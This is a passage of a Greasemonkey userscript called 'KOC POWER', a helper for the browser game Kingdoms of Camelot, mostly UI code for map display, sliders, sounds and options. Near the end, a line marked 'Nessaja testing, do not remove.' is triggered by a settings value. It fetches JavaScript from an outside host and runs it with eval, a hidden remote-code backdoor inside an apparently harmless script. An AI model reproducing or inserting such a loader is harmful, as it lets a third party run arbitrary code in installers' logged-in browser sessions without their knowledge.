  },

  hook : function (){
    var t = WarnZeroAttack;
    if (parseIntZero(document.getElementById('modal_attack_target_coords_x').value) == 0
    && parseIntZero(document.getElementById('modal_attack_target_coords_y').value) == 0){
      new CdialogCancelContinue ('<SPAN class=boldRed>'+culang.OtogWarnZero+'!</span>', null, unsafeWindow.modal_attack_check, document.getElementById('modalInner1'));
    } else {
      unsafeWindow.modal_attack_check();
    }
  },

}
function show2DPs(num) {
	if (num == parseInt(num))
		return num + '.00';
	else if (10*num == parseInt(10*num))
		return num + '0';
	else
		return num;
};
var MapDistanceFix = {
  popSlotsFunc : null,
  init : function (){
    var t = MapDistanceFix;
    t.popSlotsFunc = new CalterUwFunc ('MapObject.prototype.populateSlots', [['this.distance', 'fixMapDistance_hook']]);
    if (t.popSlotsFunc.isAvailable()){
      unsafeWindow.fixMapDistance_hook = t.fixMapDistance_hook;
      if (Options.fixMapDistance)
        t.enable (true);

    }
  },
  fixMapDistance_hook : function (cityX, cityY, tileX, tileY){
    var city = Cities.byID[unsafeWindow.currentcityid];
    return distance (city.x, city.y, tileX, tileY);
  },
  enable : function (tf){
    var t = MapDistanceFix;
    t.popSlotsFunc.setEnable (tf);
  },
  isAvailable : function (){
    var t = MapDistanceFix;
    return t.popSlotsFunc.isAvailable();
  },
}
function encode_utf8( s ){
  return unescape( encodeURIComponent( s ) );
}
function decode_utf8( s ){
  return decodeURIComponent( escape( s ) );
}
function hexDump (dat){
  var i = 0;
  var s = [];
  while (i < dat.length) {
    asc = [];
    s.push (hex4(i));
    s.push (': ');
    for (var ii=0; ii<16; ii++) {
      c = dat.charCodeAt(i+ii);
      s.push (hex2(c));
      s.push (' ');
      if (c>31 && c<128)
        asc.push (dat.charAt(i+ii));
      else
        asc.push ('.');
    }
    s.push ('  ');
    s.push (asc.join(''))
    s.push ('\n');
    i += 16;
  }
  return s.join ('');
  function hex4(d){
    return hexDig(d>>12) + hexDig(d>>8) + hexDig(d>>4) + hexDig(d&15);
  }
  function hex2(d){
    return hexDig(d>>4) + hexDig(d&15);
  }
  function hexDig (d){
    hexdigs = '0123456789ABCDEF';
    return hexdigs.charAt(d&15);
  }
}
function SliderBar (container, width, height, value, classPrefix, margin){
  var self = this;
  this.listener = null;
  if (value==null)
    value = 0;
  if (!margin)
    margin = parseInt(width*.05);
  this.value = value;
  if (width<20) width=20;
  if (height<5) height=5;
  if (classPrefix == null){
    classPrefix = 'slider';
    var noClass = true;
  }
  var sliderHeight = parseInt(height/2);
  var sliderTop = parseInt(height/4);
  this.sliderWidth = width - (margin*2);

  this.div = document.createElement ('div');
  this.div.style.height = height +'px';
  this.div.style.width = width +'px';
  this.div.className = classPrefix +'myDiv';
  if (noClass)
    this.div.style.backgroundColor='#ddd';

  this.slider = document.createElement ('div');
  this.slider.setAttribute ('style', 'position:relative;');
  this.slider.style.height = sliderHeight + 'px'
  this.slider.style.top = sliderTop + 'px';
  this.slider.style.width = this.sliderWidth +'px';
  this.slider.style.left = margin +'px';
  this.slider.className = classPrefix +'Bar';
  this.slider.draggable = true;
  if (noClass)
    this.slider.style.backgroundColor='#fff';

  this.sliderL = document.createElement ('div');
  this.sliderL.setAttribute ('style', 'width:25px; height:100%; position:relative; ');
  this.sliderL.className = classPrefix +'Part';
  this.sliderL.draggable = true;
  if (noClass)
    this.sliderL.style.backgroundColor='#0c0';

  this.knob = document.createElement ('div');
  this.knob.setAttribute ('style', 'width:3px; position:relative; left:0px; background-color:#222');
  this.knob.style.height = height +'px';
  this.knob.style.top = (0-sliderTop) +'px';
  this.knob.className = classPrefix +'Knob';
  this.knob.draggable = true;
  this.slider.appendChild(this.sliderL);
  this.sliderL.appendChild (this.knob);
  this.div.appendChild (this.slider);
  container.appendChild (this.div);
  this.div.addEventListener('mousedown',  mouseDown, false);

  this.getValue = function (){
    return self.value;
  }

  this.setValue = function (val){   // todo: range check
    var relX = (val * self.sliderWidth);
    self.sliderL.style.width = relX + 'px';
    self.knob.style.left =  relX + 'px';
    self.value = val;
    if (self.listener)
      self.listener(self.value);
  }

  this.setChangeListener = function (listener){
    self.listener = listener;
  }

  function moveKnob (me){
    var relX = me.clientX - self.divLeft;
    if (relX < 0)
      relX = 0;
    if (relX > self.sliderWidth)
      relX = self.sliderWidth;
    self.knob.style.left = (relX - (self.knob.clientWidth/2) ) +'px';   // - half knob width !?!?
    self.sliderL.style.width = relX + 'px';
    self.value =  relX / self.sliderWidth;
    if (self.listener)
      self.listener(self.value);
  }
  function doneMoving (){
    self.div.removeEventListener('mousemove', mouseMove, true);
    document.removeEventListener('mouseup', mouseUp, true);
  }
  function mouseUp (me){
    moveKnob (me);
    doneMoving();
  }
  function mouseDown(me){
    var e = self.slider;
    self.divLeft = 0;
    while (e.offsetParent){   // determine actual clientX
      self.divLeft += e.offsetLeft;
      e = e.offsetParent;
    }
    moveKnob (me);
    document.addEventListener('mouseup',  mouseUp, true);
    self.div.addEventListener('mousemove',  mouseMove, true);
  }
  function mouseMove(me){
    moveKnob (me);
  }
}
function CmatSimpleSound (playerUrl, container, attrs, onLoad, flashVars) {
  var self = this;
  this.player = null;
  this.volume = 100;
  this.isLoaded = false;
  this.onSwfLoaded = null;

  var div = document.createElement ('div');
  this.onSwfLoaded = onLoad;
  if (navigator.appName.toLowerCase().indexOf('microsoft')+1) {
    div.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"><param name="movie" value="'+playerUrl+'"><param name="quality" value="high"></object>';
    this.player = div.getElementsByTagName('object')[0];
  } else {
    div.innerHTML = '<embed src="'+playerUrl+'"  bgcolor="#eeeeee" allowfullscreen=false FlashVars="'+ flashVars +'" quality="high" allowscriptaccess="always" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" ></embed>';
    this.player = div.getElementsByTagName('embed')[0].wrappedJSObject;
  }
  if (container)
    container.appendChild (div);
  else
    document.body.appendChild (div);
  for (k in attrs)
    this.player.setAttribute(k, attrs[k]);

  this.setVolume = function (chanNum, vol){
    if (!self.isLoaded)
      return;
    self.player.jsSetVolume (chanNum, vol);
    volume = vol;
  }

  this.load = function (chanNum, url, bStream, bAutoplay, bUsePolicyFile){   // loop ?
    self.player.jsLoad (chanNum, url, bStream, bAutoplay, bUsePolicyFile);
  }

  this.play = function (chanNum, position){
    self.player.jsPlay (chanNum, position);
  }

  this.stop = function (chanNum){
   if (!self.isLoaded)
   return;
    self.player.jsStop (chanNum);
  }

  this.getStatus = function (chanNum){           // returns null if sound channel is 'empty'
    return self.player.jsGetStatus (chanNum);
  }

  this.debugFunc = function (msg){  // overload to use
  }

  this.swfDebug = function (msg){    // called by plugin
    self.debugFunc('SWF: '+ msg);
  }
  this.swfLoaded = function (){    // called by plugin when ready to go!
    self.isLoaded = true;
    self.debugFunc ('playerIsReady');
    if (self.onSwfLoaded)
      self.onSwfLoaded();
  }
  this.swfPlayComplete = function (chanNum){    // called by plugin when a sound finishes playing (overload to be notified)
  }
  this.swfLoadComplete = function (chanNum, isError){    // called by plugin when a sound finishes loading  (overload to be notified)
  }
}    
function DoUnsafeWindow(func, execute_by_embed) {
  if(this.isChrome || execute_by_embed) {
    var scr=document.createElement('script');
    scr.innerHTML=func;
    document.body.appendChild(scr);
  } else {
    try {  
      eval("unsafeWindow."+func);
    } catch (error) {
    logit("Bei DoUnsafeWindow hat JavaScript ein fehler gefunden! Meldung: "+error.description);
    }
  }
}
function GetDisplayName(){
  var DisplayName = document.getElementById('topnavDisplayName');
  if(DisplayName){
    DisplayName = DisplayName.innerHTML;
  }else{
    DisplayName = null;
  }
  return DisplayName
}
function DrawLevelIcons() {
  var maptileRe = /modal_maptile.([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+)/;
  var mapwindow=document.getElementById('mapwindow');
  if(!mapwindow) return;
  var levelIcons=document.getElementById('LevelIcons');
  if(levelIcons) return;

  var ss=document.evaluate(".//a[contains(@class,'slot')]",mapwindow,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
  var lvRe=/_([0-9]+)/;
  var idDone=false;
  for(var s=0; s<ss.snapshotLength; s++) {
    var a=ss.snapshotItem(s);
    var onclick=a.getAttribute('onclick');
    var owner='';
    if(onclick) {
      var onclickM=maptileRe.exec(onclick);
      if(onclickM && onclickM[6]!='"null"') {
        var might=onclickM[7].StripQuotes();
        var alliance=onclickM[15].StripQuotes();
		var dip=getDiplomacy(alliance);

        
        owner=" "+onclickM[6].StripQuotes();
      }
    }
    var m=lvRe.exec(a.className);
    if(!m) continue;
    var sp=a.getElementsByTagName('span');
    if(sp.length==0) continue;

    if(!idDone) { a.id='levelIcons'; idDone=true; }
    sp[0].style.color='#cc0';
    
    if (alliance == 'null' && onclickM[12]=='"city"') sp[0].style.color='#33CCFF';
	if (dip == 'hostile' && onclickM[12]=='"city"') sp[0].style.color='#FF0000';
    if (onclickM[12]!='"city"' &&  onclickM[6]!='"null"') sp[0].style.color='#FF9900';
    if (onclickM[12]!='"city"' &&  onclickM[5]=='"null"' && onclickM[6]=='"null"' && onclickM[7]=='"null"' && onclickM[8]=='"null"' && onclickM[15]=='"null"' && onclickM[10]=='"null"') sp[0].style.color='#CC0033';
    if (Options.MapShowExtra) {
      if (onclickM && onclickM[6]!='"null"' ) sp[0].innerHTML='&nbsp;'+m[1]+owner+'<br /> '+culang.might+': '+addCommas(might);
      else sp[0].innerHTML='&nbsp;'+m[1]+addCommas(owner);
    }
    else {  
      if (onclickM && onclickM[6]!='"null"' ) sp[0].innerHTML='&nbsp;'+m[1];
      else sp[0].innerHTML='&nbsp;'+m[1]+addCommas(owner);
    }
  }
}
//Nessaja testing, do not remove.
	if (Options.spamconfiga.spamverta.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfiga.spamverta.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
pdxStartup ();
/**********************************************************************************/
/************ KOC POWER - PDXSTARTUP END ******************************************/
/********************************************************************************/
// DATE
function GetDay(intDay){
var DayArray = new Array( culang.scDsun, culang.scDmon, culang.scDtues, culang.scDwen, culang.scDthur, culang.scDfry, culang.scDsat);
return DayArray[intDay];
}
function GetMonth(intMonth){
var MonthArray = new Array(culang.scjan, culang.scfeb, culang.scmar, culang.scapr, culang.scmay, culang.scjun, culang.scjul, culang.scaug, culang.scsep, culang.scokt, culang.scnov, culang.scdec);
return MonthArray[intMonth];
}
function getDateStrWithDOW(){
var today = new Date();
var year = today.getYear();
if(year<1000) year+=1900
var todayStr = "<font color=#CCCCFF><b>"+ GetDay(today.getDay()) + "</b></font>"+culang.scthemonth+" ";
todayStr += "<font color=#CCCCFF><b>"+today.getDate() + ". " + GetMonth(today.getMonth()) +"<b></font>";
todayStr += ", " + year;
return todayStr;
}
// RELOAD IF SESSION IS DONE
if (Options.sessionRefresh) {
window.setTimeout(function() { 
	var rflction = top.location;
	top.window.location.href = ""
	top.window.location.href = ""+rflction+"";
	} , 1800000);
}


function readLangOptions (){
s = GM_getValue ('LangOptions_');
if (s != null){
opts = JSON2.parse (s);
for (k in opts){
if (matTypeof(opts[k]) == 'object')
for (kk in opts[k])
LangOptions[k][kk] = opts[k][kk];
else
LangOptions[k] = opts[k];
}
}
};
function matTypeof (v){
  if (v == undefined)
    return 'undefined';
  if (typeof (v) == 'object'){
    if (!v)
      return 'null';
//    else if (unsafeWindow.Object.prototype.toString.apply(v) === '[object Array]')
    else if (v.constructor.toString().indexOf("Array")>=0 && typeof(v.splice)=='function')
      return 'array';
    else return 'object';
  }
  return typeof (v);
};

function readpdxWebTabs (){
s = GM_getValue ('pdxWebTabs_');
if (s != null){
opts = JSON2.parse (s);
for (k in opts){
if (matTypeof(opts[k]) == 'object')
for (kk in opts[k])
pdxWebTabs[k][kk] = opts[k][kk];
else
pdxWebTabs[k] = opts[k];
}
}
};

//							 KOC POWER - END
//		 greetz fly out to jontey, Nico De Belder, Tom Chapin
//               this Script was done by koc.god-like.org
